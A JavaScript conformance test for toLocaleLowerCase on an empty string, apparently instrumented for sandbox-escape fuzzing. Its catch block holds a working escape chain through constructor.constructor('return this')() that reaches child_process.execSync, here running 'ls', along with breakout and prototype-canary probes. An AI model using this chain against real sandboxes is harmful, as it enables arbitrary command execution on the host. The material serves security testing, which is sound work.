try {
    var __lowerCase = ''.toLocaleLowerCase();
    var __expected = '';
    if (__lowerCase.length !== __expected.length) {
        $ERROR('#1: __lowerCase = "".toLocaleLowerCase(); __expected = ""; __lowerCase.length === __expected.length. Actual: ' + __lowerCase.length);
    }
    if (__lowerCase.index !== __expected.index) {
        $ERROR('#2: __lowerCase = "".toLocaleLowerCase(); __expected = ""; __lowerCase.index === __expected.index. Actual: ' + __lowerCase.index);
    }
    if (__lowerCase.input !== __expected.input) {
        $ERROR('#3: __lowerCase = "".toLocaleLowerCase(); __expected = ""; __lowerCase.input === __expected.input. Actual: ' + __lowerCase.input);
    }
    if (__lowerCase[0] !== __expected[0]) {
        $ERROR('#4: __lowerCase = "".toLocaleLowerCase(); __expected = ""; __lowerCase[0]===__expected[0]. Actual: ' + __lowerCase[0]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}